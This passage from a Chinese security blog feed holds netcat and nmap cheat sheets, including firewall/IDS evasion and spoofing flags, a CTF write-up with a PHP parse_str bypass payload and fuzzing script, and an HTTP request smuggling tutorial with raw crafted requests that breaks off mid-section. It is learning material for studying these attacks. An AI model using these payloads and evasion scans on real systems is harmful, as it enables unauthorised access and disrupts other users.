class="code"><pre><span class="line">发送端：tar -cvf - music/ | nc -lp 333 –q 1</span><br><span class="line">接收端：nc -nv 1.1.1.1 333 | tar -xvf -</span><br></pre></td></tr></table></figure><p>注意有个<code>-</code></p><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvz 1.1.1.1 1-100</span><br></pre></td></tr></table></figure><p>n 参数作用是跟 ip 地址，不做 dns 域名解析,v 参数是显示详细信息。z 参数就是扫描模式，默认就是 tcp 全链接扫描。</p><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><h3 id="Nmap-参数详解"><a href="#Nmap-参数详解" class="headerlink" title="Nmap 参数详解"></a>Nmap 参数详解</h3><p>Nmap支持主机名,ip,网段的表示方式</p><p>例如:blah.highon.coffee, namp.org/24, 192.168.0.1;10.0.0-25.1-254</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-iL filename                    从文件中读取待检测的目标,文件中的表示方法支持机名,ip,网段</span><br><span class="line">-iR hostnum                     随机选取,进行扫描.如果-iR指定为0,则是无休止的扫描</span><br><span class="line">--exclude host1[, host2]        从扫描任务中需要排除的主机           </span><br><span class="line">--exculdefile exclude_file      排除文件中的IP,格式和-iL指定扫描文件的格式相同</span><br></pre></td></tr></table></figure><p>主机发现</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-sL                     仅仅是显示,扫描的IP数目,不会进行任何扫描</span><br><span class="line">-sn                     ping扫描,即主机发现</span><br><span class="line">-Pn                     不检测主机存活</span><br><span class="line">-PS/PA/PU/PY[portlist]  TCP SYN Ping/TCP ACK Ping/UDP Ping发现</span><br><span class="line">-PE/PP/PM               使用ICMP <span class="built_in">echo</span>, timestamp and netmask 请求包发现主机</span><br><span class="line">-PO[prococol list]      使用IP协议包探测对方主机是否开启   </span><br><span class="line">-n/-R                   不对IP进行域名反向解析/为所有的IP都进行域名的反响解析</span><br></pre></td></tr></table></figure><p>扫描技巧</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-sS/sT/sA/sW/sM                 TCP SYN/TCP connect()/ACK/TCP窗口扫描/TCP Maimon扫描</span><br><span class="line">-sU                             UDP扫描</span><br><span class="line">-sN/sF/sX                       TCP Null，FIN，and Xmas扫描</span><br><span class="line">--scanflags                     自定义TCP包中的flags</span><br><span class="line">-sI zombie host[:probeport]     Idlescan</span><br><span class="line">-sY/sZ                          SCTP INIT/COOKIE-ECHO 扫描</span><br><span class="line">-sO                             使用IP protocol 扫描确定目标机支持的协议类型</span><br><span class="line">-b “FTP relay host”             使用FTP bounce scan</span><br></pre></td></tr></table></figure><p>指定端口和扫描顺序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-p                      特定的端口 -p80,443 或者 -p1-65535</span><br><span class="line">-p U:PORT               扫描udp的某个端口, -p U:53</span><br><span class="line">-F                      快速扫描模式,比默认的扫描端口还少</span><br><span class="line">-r                      不随机扫描端口,默认是随机扫描的</span><br><span class="line">--top-ports &quot;number&quot;    扫描开放概率最高的number个端口,出现的概率需要参考nmap-services文件,ubuntu中该文件位于&#x2F;usr&#x2F;share&#x2F;nmap.nmap默认扫前1000个</span><br><span class="line">--port-ratio &quot;ratio&quot;    扫描指定频率以上的端口</span><br></pre></td></tr></table></figure><p>服务版本识别</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-sV                             开放版本探测,可以直接使用-A同时打开操作系统探测和版本探测</span><br><span class="line">--version-intensity &quot;level&quot;     设置版本扫描强度,强度水平说明了应该使用哪些探测报文。数值越高，服务越有可能被正确识别。默认是7</span><br><span class="line">--version-light                 打开轻量级模式,为--version-intensity 2的别名</span><br><span class="line">--version-all                   尝试所有探测,为--version-intensity 9的别名</span><br><span class="line">--version-trace                 显示出详细的版本侦测过程信息</span><br></pre></td></tr></table></figure><p>脚本扫描</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-sC                             根据端口识别的服务,调用默认脚本</span><br><span class="line">--script&#x3D;”Lua scripts”          调用的脚本名</span><br><span class="line">--script-args&#x3D;n1&#x3D;v1,[n2&#x3D;v2]     调用的脚本传递的参数</span><br><span class="line">--script-args-file&#x3D;filename     使用文本传递参数</span><br><span class="line">--script-trace                  显示所有发送和接收到的数据</span><br><span class="line">--script-updatedb               更新脚本的数据库</span><br><span class="line">--script-help&#x3D;”Lua script”      显示指定脚本的帮助</span><br></pre></td></tr></table></figure><p>OS识别</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-O              启用操作系统检测,-A来同时启用操作系统检测和版本检测</span><br><span class="line">--osscan-limit  针对指定的目标进行操作系统检测(至少需确知该主机分别有一个open和closed的端口)</span><br><span class="line">--osscan-guess  推测操作系统检测结果,当Nmap无法确定所检测的操作系统时，会尽可能地提供最相近的匹配，Nmap默认进行这种匹配</span><br></pre></td></tr></table></figure><p>防火墙/IDS躲避和哄骗</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">-f; --mtu value                 指定使用分片、指定数据包的MTU.</span><br><span class="line">-D decoy1,decoy2,ME             使用诱饵隐蔽扫描</span><br><span class="line">-S IP-ADDRESS                   源地址欺骗</span><br><span class="line">-e interface                    使用指定的接口</span><br><span class="line">-g&#x2F; --source-port PROTNUM       使用指定源端口  </span><br><span class="line">--proxies url1,[url2],...       使用HTTP或者SOCKS4的代理 </span><br><span class="line"></span><br><span class="line">--data-length NUM               填充随机数据让数据包长度达到NUM</span><br><span class="line">--ip-options OPTIONS            使用指定的IP选项来发送数据包</span><br><span class="line">--ttl VALUE                     设置IP time-to-live域</span><br><span class="line">--spoof-mac ADDR&#x2F;PREFIX&#x2F;VEBDOR  MAC地址伪装</span><br><span class="line">--badsum                        使用错误的checksum来发送数据包</span><br></pre></td></tr></table></figure><p>Nmap 输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">-oN                     将标准输出直接写入指定的文件</span><br><span class="line">-oX                     输出xml文件</span><br><span class="line">-oS                     将所有的输出都改为大写</span><br><span class="line">-oG                     输出便于通过bash或者perl处理的格式,非xml</span><br><span class="line">-oA BASENAME            可将扫描结果以标准格式、XML格式和Grep格式一次性输出</span><br><span class="line">-v                      提高输出信息的详细度</span><br><span class="line">-d level                设置debug级别,最高是9</span><br><span class="line">--reason                显示端口处于带确认状态的原因</span><br><span class="line">--open                  只输出端口状态为open的端口</span><br><span class="line">--packet-trace          显示所有发送或者接收到的数据包</span><br><span class="line">--iflist                显示路由信息和接口,便于调试</span><br><span class="line">--log-errors            把日志等级为errors&#x2F;warings的日志输出</span><br><span class="line">--append-output         追加到指定的文件</span><br><span class="line">--resume FILENAME       恢复已停止的扫描</span><br><span class="line">--stylesheet PATH&#x2F;URL   设置XSL样式表，转换XML输出</span><br><span class="line">--webxml                从namp.org得到XML的样式</span><br><span class="line">--no-sytlesheet         忽略XML声明的XSL样式表</span><br></pre></td></tr></table></figure><p>其他nmap选项</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-6                      开启IPv6</span><br><span class="line">-A                      OS识别,版本探测,脚本扫描和traceroute</span><br><span class="line">--datedir DIRNAME       说明用户Nmap数据文件位置</span><br><span class="line">--send-eth &#x2F; --send-ip  使用原以太网帧发送&#x2F;在原IP层发送</span><br><span class="line">--privileged            假定用户具有全部权限</span><br><span class="line">--unprovoleged          假定用户不具有全部权限,创建原始套接字需要root权限</span><br><span class="line">-V                      打印版本信息</span><br><span class="line">-h                      输出帮助</span><br></pre></td></tr></table></figure><h3 id="端口状态"><a href="#端口状态" class="headerlink" title="端口状态"></a>端口状态</h3><ul><li>open：确定端口开放，可达</li><li>closed ：关闭的端口对于nmap也是可访问的， 它接收nmap探测报文并作出响应。但没有应用程序在其上监听。</li><li>filtered ：由于包过滤阻止探测报文到达端口，Nmap无法确定该端口是否开放。过滤可能来自专业的防火墙设备，路由规则 或者主机上的软件防火墙。</li><li>unfiltered ：未被过滤状态意味着端口可访问，但是Nmap无法确定它是开放还是关闭。 只有用于映射防火墙规则集的 ACK 扫描才会把端口分类到这个状态。</li><li>open | filtered ：无法确定端口是开放还是被过滤， 开放的端口不响应就是一个例子。没有响应也可能意味着报文过滤器丢弃了探测报文或者它引发的任何反应。UDP，IP协议,FIN, Null 等扫描会引起。</li><li>closed|filtered：（关闭或者被过滤的）：无法确定端口是关闭的还是被过滤的</li></ul><h3 id="扫描技术"><a href="#扫描技术" class="headerlink" title="扫描技术"></a>扫描技术</h3><ul><li>-sS/sT/sA/sW/sM:TCP扫描<ul><li>S是SYN扫描，半连接扫描，nmap只发送SYN报文，通过服务器是否响应SYN+ACK来判断对应端口是否开放</li><li>T是全连接扫描会和服务器建立完整的三次握手，效率低</li><li>A发送ACK报文，通过服务器响应来判断是否开放，有的服务器不开会回复ICMP端口不可达，当回复RST时表示可能被拦截或者端口开放，不是一个准确的判断条件</li><li>W 是窗口扫描，发出的报文和ACK一样，利用的是在某些系统中如果端口开放，收到ACK包后会响应一个窗口非0的RST包</li><li>M是Maimon扫描，使用发现者的名字命名。其原理是向目标服务器发送FIN/ACK 报文，在某些系统中如果端口开放则会丢弃该报文不做响应，如果端口关闭则回复RST或者ICMP，Nmap可借此判断服务器端口的开放情况。不准</li></ul></li><li>-sU：UDP扫描，某些系统如果UDP端口不开放会回复ICMP差错报文（这也是Linux系统中traceroute的实现原理）。Nmap UDP端口扫描的强大之处在于它会针对知名端口构造初始交互报文，比如会针对UDP 500构造一个主模式协商的IKE报文</li><li>-sN/sF/sX:特定TCP标志位的扫描，N是空标志位；F是FIN置位；X是Xmas扫描将FIN、PSH、URG同时置位。收到RST说明端口关闭，无响应说明被过滤或者端口开放，不准。</li><li>–scanflags &lt;flags&gt;：实现上同上面几种类似，可以让用户自定义TCP标志位。</li><li>-sI &lt;zombie host[:probeport]&gt;: Idle扫描需要一台没有流量的僵尸主机，这种扫描的实现原理是在一定的时间里，同一台主机发出的IP数据报文其ip头中的identification字段是累加的。探测分为3步：1、Nmap主机向僵尸机发包，通过僵尸机的响应包探测其ID；2、Nmap主机伪造僵尸机源地址向服务器的特定端口发送SYN包；3、Nmap主机再次探测僵尸机的ip.id。如果目标服务器端口开放，则必然会向僵尸机发送SYN/ACK，由于莫名其妙收到一个SYN/ACK 报文，僵尸机会向目标服务器发送RST报文，该报文的ip.id 是第一步+1，则第三步Nmap主机探测到的ip.id应该是第一步+2，说明目标主机端口开放。反之，如果目标主机端口未开放，则收到第二步的报文后会向僵尸机回复RST或者直接丢弃该报文不响应，无论哪种情况，都不会触发僵尸机发包，进而僵尸机的ip.id不会变化，第三步Nmap探测到的id应该是第一步+1.</li><li>-sY/sZ:SCTP协议INIT或cookie-echo扫描</li><li>-sO:基于IP协议的扫描，通过变换IP报文头中的Protocol值来对服务器进行探测</li><li>-b &lt;FTP relay host&gt;:：FTP反弹扫描，借助FTP特性，通过FTP服务器连接想要扫描的主机实现隐身的目的</li></ul><h2 id="WireShark"><a href="#WireShark" class="headerlink" title="WireShark"></a>WireShark</h2><p>参考：<a href="https://www.cnblogs.com/mq0036/p/11187138.html">https://www.cnblogs.com/mq0036/p/11187138.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> NetCat </tag>
            
            <tag> Nmap </tag>
            
            <tag> WireShack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP的字符串解析特性</title>
      <link href="2020/01/17/PHP%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%A7%A3%E6%9E%90%E7%89%B9%E6%80%A7/"/>
      <url>2020/01/17/PHP%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%A7%A3%E6%9E%90%E7%89%B9%E6%80%A7/</url>
      
        <content type="html"><![CDATA[<p>本篇博客主要介绍了PHP的字符串解析特性相关内容！</p><a id="more"></a><h2 id="PHP的字符串解析特性"><a href="#PHP的字符串解析特性" class="headerlink" title="PHP的字符串解析特性"></a>PHP的字符串解析特性</h2><p> PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：</p><ol><li>删除空白符 </li><li>将某些字符转换为下划线(包括空格)</li></ol><p>php解析变量是用<code>parse_str()</code>来解析的，关于这个函数的详细用法参见：<a href="https://www.php.net/parse_str">https://www.php.net/parse_str</a></p><img src="/2020/01/17/PHP%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%A7%A3%E6%9E%90%E7%89%B9%E6%80%A7/TIM截图20200117194140.png" style="zoom:67%;"><p>删除空白符这个很好理解，先看道ctf题目:</p><p>再说下将某些字符转换为下划线这个特性吧，还是先看一道题吧！</p><p>奇怪的恐龙特性题目源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line">ini_set(<span class="string">&quot;display_error&quot;</span>, <span class="literal">false</span>);  </span><br><span class="line">error_reporting(<span class="number">0</span>);  </span><br><span class="line">$str = <span class="keyword">isset</span>($_GET[<span class="string">&#x27;A_A&#x27;</span>])?$_GET[<span class="string">&#x27;A_A&#x27;</span>]:<span class="string">&#x27;A_A&#x27;</span>; </span><br><span class="line"><span class="keyword">if</span> (strpos($_SERVER[<span class="string">&#x27;QUERY_STRING&#x27;</span>], <span class="string">&quot;A_A&quot;</span>) !==<span class="literal">false</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;A_A,have fun&#x27;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">elseif</span> ($str&lt;<span class="number">9999999999</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;A_A,too small&#x27;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">elseif</span> ((<span class="keyword">string</span>)$str&gt;<span class="number">0</span>) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;A_A,too big&#x27;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span>&#123; </span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="string">&#x27;flag.php&#x27;</span>); </span><br><span class="line">&#125; </span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>首先在请求的url后面不能有<code>A_A</code>，并且要不满足下面两个比较条件</p><p>所以，我们可以构造下面的payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?A A[]&#x3D;a</span><br></pre></td></tr></table></figure><p>php会将<code>A A</code>解析成<code>A_A</code>，数组大于任何数字，对数组强制string类型转换会转换成a，a和0比较时，a会转换为整型即0</p><table><thead><tr><th align="left">用户输入</th><th align="left">解析前</th><th align="left">解析后变量名</th></tr></thead><tbody><tr><td align="left">%20foo_bar%00</td><td align="left">foo_bar</td><td align="left">foo_bar</td></tr><tr><td align="left">foo%20bar%00</td><td align="left">foo bar</td><td align="left">foo_bar</td></tr><tr><td align="left">foo%5bbar</td><td align="left">foo[bar</td><td align="left">foo_bar</td></tr></tbody></table><p>直观的看下<code>parser_str</code>函数如何处理字符串：</p><img src="/2020/01/17/PHP%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%A7%A3%E6%9E%90%E7%89%B9%E6%80%A7/1567560394_5d6f12cab5cdc.gif" style="zoom: 33%;"><p>下面有个脚本，遍历了所有字符，以<code>foo_bar</code>为例，遍历了三个位置php在解析时的不同</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">foreach</span>(</span><br><span class="line">    [</span><br><span class="line">        <span class="string">&quot;&#123;chr&#125;foo_bar&quot;</span>,</span><br><span class="line">        <span class="string">&quot;foo&#123;chr&#125;bar&quot;</span>,</span><br><span class="line">        <span class="string">&quot;foo_bar&#123;chr&#125;&quot;</span></span><br><span class="line">    ] <span class="keyword">as</span> $k =&gt; $arg) &#123;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;=<span class="number">255</span>;$i++) &#123;</span><br><span class="line">        <span class="comment">// echo &quot;\033[999D\033[K\r&quot;;</span></span><br><span class="line">        <span class="comment">// echo &quot;[&quot;.$arg.&quot;] check &quot;.bin2hex(chr($i)).&quot;\n&quot;;</span></span><br><span class="line">        parse_str(str_replace(<span class="string">&quot;&#123;chr&#125;&quot;</span>,chr($i),$arg).<span class="string">&quot;=bla&quot;</span>,$o);</span><br><span class="line">        usleep(<span class="number">5000</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($o[<span class="string">&quot;foo_bar&quot;</span>])) &#123;</span><br><span class="line">            <span class="comment">// echo &quot;\033[999D\033[K\r&quot;;</span></span><br><span class="line">            <span class="keyword">echo</span> $arg.<span class="string">&quot; -&gt; &quot;</span>.bin2hex(chr($i)).<span class="string">&quot; (&quot;</span>.chr($i).<span class="string">&quot;)\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// echo &quot;\033[999D\033[K\r&quot;;</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2020/01/17/PHP%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%A7%A3%E6%9E%90%E7%89%B9%E6%80%A7/TIM截图20200117205713.png" style="zoom:50%;"><p>初步试了下,发现和脚本结果一样，发现三个位置的差别：</p><ol><li>第一个位置为<code>%20</code>,<code>%26</code>,<code>%2b</code>时都会忽略</li><li>第二个位置为<code>%20</code>,<code>%2b</code>,<code>%2e</code>,<code>%5b</code>都会替换成<code>_</code>，即<code>%5f</code></li><li>第三个位置为<code>%00</code>,<code>%26</code>,<code>%3d</code>时都会忽略</li></ol><p>后来发现，变量名中有<code>%20</code>,<code>%2b</code>,<code>%2e</code>,<code>%5b</code>都会替换成<code>_</code>，即<code>%5f</code></p><p>参考：</p><p><a href="https://www.freebuf.com/articles/web/213359.html">https://www.freebuf.com/articles/web/213359.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> php </tag>
            
            <tag> bypass </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>http走私学习</title>
      <link href="2020/01/17/http%E8%B5%B0%E7%A7%81%E5%AD%A6%E4%B9%A0/"/>
      <url>2020/01/17/http%E8%B5%B0%E7%A7%81%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>本篇博客主要介绍了http走私相关内容！</p><a id="more"></a><h2 id="什么是http走私？"><a href="#什么是http走私？" class="headerlink" title="什么是http走私？"></a>什么是http走私？</h2><p>HTTP请求走私是一种干扰网站处理从一个或多个用户接收的HTTP请求序列的方式的技术。使攻击者可以绕过安全控制，未经授权访问敏感数据并直接危害其他应用程序用户。</p><h2 id="为什么会产生http走私？"><a href="#为什么会产生http走私？" class="headerlink" title="为什么会产生http走私？"></a>为什么会产生http走私？</h2><h3 id="请求走私漏洞成因"><a href="#请求走私漏洞成因" class="headerlink" title="请求走私漏洞成因"></a>请求走私漏洞成因</h3><p>前端服务器(CDN)和后端服务器接收数据不同步，引起对客户端传入的数据理解不一致，从而导致漏洞的产生。</p><p>大多数HTTP请求走私漏洞的出现是因为HTTP规范提供了两种不同的方法来指定请求的结束位置：<code>Content-Length</code>标头和<code>Transfer-Encoding</code>标头。</p><p>同时使用两种不同的方法时，<code>Content-Length</code>无效。当使用多个服务器时，对客户端传入的数据理解不一致时，就会出现有些服务器认为<code>Content-Length</code>的长度有效，有些以<code>Transfer-Encoding</code>有效。而一般情况下，反向代理服务器与后端的源站服务器之间，会重用TCP链接。这样超出的长度就会拼接到下一次请求进行请求，从而导致HTTP请求走私漏洞。</p><h3 id="http1-1的两个特性"><a href="#http1-1的两个特性" class="headerlink" title="http1.1的两个特性"></a>http1.1的两个特性</h3><p>在<code>HTTP1.1</code>中，增加了<code>Keep-Alive</code>和<code>Pipeline</code>这两个特性。</p><p>所谓<code>Keep-Alive</code>，就是在HTTP请求中增加一个特殊的请求头<code>Connection: Keep-Alive</code>，告诉服务器，接收完这次HTTP请求后，不要关闭TCP链接，后面对相同目标服务器的HTTP请求，重用这一个TCP链接，这样只需要进行一次TCP握手的过程，可以减少服务器的开销，节约资源，还能加快访问速度。当然，这个特性在<code>HTTP1.1</code>中是默认开启的。</p><p>有了<code>Keep-Alive</code>之后，后续就有了<code>Pipeline</code>，在这里呢，客户端可以像流水线一样发送自己的HTTP请求，而不需要等待服务器的响应，服务器那边接收到请求后，需要遵循先入先出机制，将请求和响应严格对应起来，再将响应发送给客户端</p><h2 id="http走私类型"><a href="#http走私类型" class="headerlink" title="http走私类型"></a>http走私类型</h2><p>HTTP请求走私攻击涉及将<code>Content-Length</code>标头和<code>Transfer-Encoding</code>标头都放置在单个HTTP请求中并进行处理，以便前端服务器和后端服务器以不同的方式处理请求。完成此操作的确切方式取决于两个服务器的行为：</p><ul><li>CL.CL：前端服务器使用Content-Length标头，后端服务器也使用Content-Length标头。</li><li>CL.TE：前端服务器使用Content-Length标头，而后端服务器使用Transfer-Encoding标头。</li><li>TE.CL：前端服务器使用Transfer-Encoding标头，而后端服务器使用Content-Length标头。</li><li>TE.TE：前端服务器和后端服务器都支持Transfer-Encoding标头，但是可以通过对标头进行某种方式的混淆来诱导其中一台服务器不对其进行处理。</li></ul><h2 id="HTTP请求走私攻击的五种方式"><a href="#HTTP请求走私攻击的五种方式" class="headerlink" title="HTTP请求走私攻击的五种方式"></a>HTTP请求走私攻击的五种方式</h2><h3 id="CL不为0"><a href="#CL不为0" class="headerlink" title="CL不为0"></a>CL不为0</h3><p>所有不携带请求体的HTTP请求都有可能受此影响。这里用GET请求举例。<br>前端代理服务器允许GET请求携带请求体；后端服务器不允许GET请求携带请求体，它会直接忽略掉GET请求中的<code>Content-Length</code>头，不进行处理。这就有可能导致请求走私。</p><p><strong>构造请求示例</strong>：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1\r\n</span><br><span class="line"><span class="attribute">Host</span>: test.com\r\n</span><br><span class="line"><span class="attribute">Content-Length</span>: 44\r\n</span><br><span class="line"></span><br><span class="line">GET / secret HTTP/1.1\r\n</span><br><span class="line"><span class="attribute">Host</span>: test.com\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\r\n&#96;是换行的意思，windows的换行是&#96;\r\n&#96;，unix的是&#96;\n&#96;，mac的是&#96;\r</span><br></pre></td></tr></table></figure></blockquote><p><strong>攻击流程</strong>：<br>前端服务器收到该请求，读取<code>Content-Length</code>，判断这是一个完整的请求。<br>然后转发给后端服务器，后端服务器收到后，因为它不对<code>Content-Length</code>进行处理，由于<code>Pipeline</code>的存在，后端服务器就认为这是收到了两个请求，分别是：</p><p>第一个：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1\r\n</span><br><span class="line"><span class="attribute">Host</span>: test.com\r\n</span><br></pre></td></tr></table></figure><p>第二个：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET / secret HTTP/1.1\r\n</span><br><span class="line"><span class="attribute">Host</span>: test.com\r\n</span><br></pre></td></tr></table></figure><p>所以造成了请求走私。</p><h3 id="CL-CL"><a href="#CL-CL" class="headerlink" title="CL-CL"></a>CL-CL</h3><p><strong>RFC7230规范</strong></p><blockquote><p>在RFC7230的第3.3.3节中的第四条中，规定当服务器收到的请求中包含两个<code>Content-Length</code>，而且两者的值不同时，需要返回400错误。</p></blockquote><p>有些服务器不会严格的实现该规范，假设中间的代理服务器和后端的源站服务器在收到类似的请求时，都不会返回400错误。<br>但是中间代理服务器按照第一个<code>Content-Length</code>的值对请求进行处理，而后端源站服务器按照第二个<code>Content-Length</code>的值进行处理。<br><strong>构造请求示例</strong>：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1\r\n</span><br><span class="line"><span class="attribute">Host</span>: test.com\r\n</span><br><span class="line"><span class="attribute">Content-Length</span>: 8\r\n</span><br><span class="line"><span class="attribute">Content-Length</span>: 7\r\n</span><br><span class="line"></span><br><span class="line"><span class="attribute">12345\r\n</span></span><br><span class="line"><span class="attribute">a</span></span><br></pre></td></tr></table></figure><p><strong>攻击流程</strong>：<br>中间代理服务器获取到的数据包的长度为8，将上述整个数据包原封不动的转发给后端的源站服务器。<br>而后端服务器获取到的数据包长度为7。当读取完前7个字符后，后端服务器认为已经读取完毕，然后生成对应的响应，发送出去。而此时的缓冲区去还剩余一个字母<code>a</code>，对于后端服务器来说，这个<code>a</code>是下一个请求的一部分，但是还没有传输完毕。<br>如果此时有一个其他的正常用户对服务器进行了请求：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /index.html HTTP/1.1\r\n</span><br><span class="line"><span class="attribute">Host</span>: test.com\r\n</span><br></pre></td></tr></table></figure><p>因为代理服务器与源站服务器之间一般会重用TCP连接。所以正常用户的请求就拼接到了字母<code>a</code>的后面，当后端服务器接收完毕后，它实际处理的请求其实是：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aGET /index.html HTTP/1.1\r\n</span><br><span class="line"><span class="attribute">Host</span>: test.com\r\n</span><br></pre></td></tr></table></figure><p>这时，用户就会收到一个类似于<code>aGET request method not found</code>的报错。这样就实现了一次HTTP走私攻击，而且还对正常用户的行为造成了影响，而且还可以扩展成类似于CSRF的攻击方式。</p><p>但是一般的服务器都不会接受这种存在两个请求头的请求包。该怎么办呢？<br>所以想到前面所说的<br><strong>RFC2616规范</strong></p><blockquote><p>如果收到同时存在<code>Content-Length</code>和<code>Transfer-Encoding</code>这两个请求头的请求包时，在处理的时候必须忽略<code>Content-Length</code>。</p></blockquote><p>所以请求包中同时包含这两个请求头并不算违规，服务器也不需要返回400错误。导致服务器在这里的实现更容易出问题。</p><h3 